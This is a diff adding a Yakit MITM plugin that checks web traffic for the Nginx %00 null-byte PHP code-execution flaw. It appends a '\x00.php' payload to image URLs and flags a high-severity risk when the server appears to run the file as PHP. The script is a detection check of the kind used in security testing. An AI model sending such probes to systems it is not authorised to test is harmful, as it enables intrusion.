@@ -1,0 +1,108 @@
+# mitm plugin template
+
+yakit_output(MITM_PARAMS)
+
+#-----------------------MITM Hooks I/O-------------------------
+/*
+#如何使用插件参数？
+
+## 例如，如果你设置了一个参数为 url_keyword 的参数，可以通过 MITM_PARAMS 来使用它！
+urlKeyword = MITM_PARAMS["url_keyword"]
+
+# 如何输出给 Yakit 给用户查看？
+
+yakit_output(i: any) // 可以只输出到 "Console 界面"
+yakit_save(i: any)   // 可以输出并保存到数据库中，在 "插件输出" 中查看
+*/
+#----------------MITM Hooks Test And Quick Debug-----------------
+/*
+# __test__ 是 yakit mitm 插件用于调试的函数 【注意：这个函数在 MITM hooks劫持环境下不会被导入】
+
+在这个函数中，你可以使用 yakit.GenerateYakitMITMHooksParams(method: string, url: string, opts ...http.Option) 来方便的生成可供 hooks 调用的参数，参考代码模版中的用法～
+
+*/
+
+
+#--------------------------WORKSPACE-----------------------------
+
+sendExp = func(isHttps,url,rsp,req){
+
+    #原始正常访问png，jpg等图片的流量
+    oriHeaders,oriBody = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+    
+    
+    #把url解析成一个url.URL
+    urlIns,err = str.ParseStringUrlToUrlInstance(url)
+    #fuzz生成请求
+    freq,err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
+    #添加payload %00.php访问图片，看服务器是否解析成php文件
+    nullb = codec.DecodeHex(`%00`)[0]
+    // payload = str.f(`%v.php`, nullb)
+    // payload = "/.php"
+    payload = "\x00.php"
+    prsp,err = freq.FuzzPath(urlIns.Path+payload).ExecFirst()
+    pHeaders,pBody = str.SplitHTTPHeadersAndBodyFromPacket(prsp.ResponseRaw)
+    dump(payload)
+    println(payload)
+    if !str.MatchAllOfSubString(pHeaders, "HTTP/1.1 200") {
+        return
+    }
+    if str.MatchAllOfSubString(oriHeaders, "php") && str.MatchAllOfRegexp(pHeaders,"X-Powered-By: .*((?i)php).*") {
+        risk.NewRisk(
+            riskTarget, risk.severity("high"), risk.type("poc"),
+            risk.title("Nginx %00 Null Byte Code Execution Vulnerability"),            ## English Title for Risk
+            risk.titleVerbose("Nginx %00空字节代码执行漏洞!"),           ##  中文标题
+            risk.details({
+                "target": prsp.Url,
+                "request": prsp.RequestRaw,
+                "response": prsp.ResponseRaw,
+            }),
+        )
+    }
+    calcBody = str.CalcSimilarity(pBody,oriBody)
+    if calcBody < 0.9 && str.MatchAllOfRegexp(pHeaders,"X-Powered-By: .*((?i)php).*") {
+        risk.NewRisk(
+            riskTarget, risk.severity("high"), risk.type("poc"),
+            risk.title("Nginx %00 Null Byte Code Execution Vulnerability"),            ## English Title for Risk
+            risk.titleVerbose("Nginx %00空字节代码执行漏洞"),           ##  中文标题
+            risk.details({
+                "target": prsp.Url,
+                "request": prsp.RequestRaw,
+                "response": prsp.ResponseRaw,
+            }),
+        )
+    }
+
+
+
+}
+
+
+
+checkServer = func(rsp){
+    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+    if  str.MatchAllOfRegexp(headers, "Server: .*((?i)nginx).*") && str.MatchAllOfSubString(headers, "HTTP/1.1 200") {
+        return true
+    }
+    return false
+}
+__test__ = func() {
+    rsp, err = http.Get("http://192.168.0.18/uploadfiles/286c67f1fa50b7c7d6f27c862b326f8a.png")
+    die(err)
+
+
+    mirrorHTTPFlow(false, "http://192.168.0.18/uploadfiles/286c67f1fa50b7c7d6f27c862b326f8a.png", nil, http.dump(rsp)[0], nil)
+
+}
+
+
+# mirrorHTTPFlow 会镜像所有的流量到这里，包括 .js / .css / .jpg 这类一般会被劫持程序过滤的请求
+mirrorHTTPFlow = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    // rootUrl = str.ParseStringUrlToWebsiteRootPath(url)
+    // dump(rsp)
+    if checkServer(rsp) {
+        // dump(rsp)
+        sendExp(isHttps,url,rsp,req)
+        // println(url)
+    }   
+}
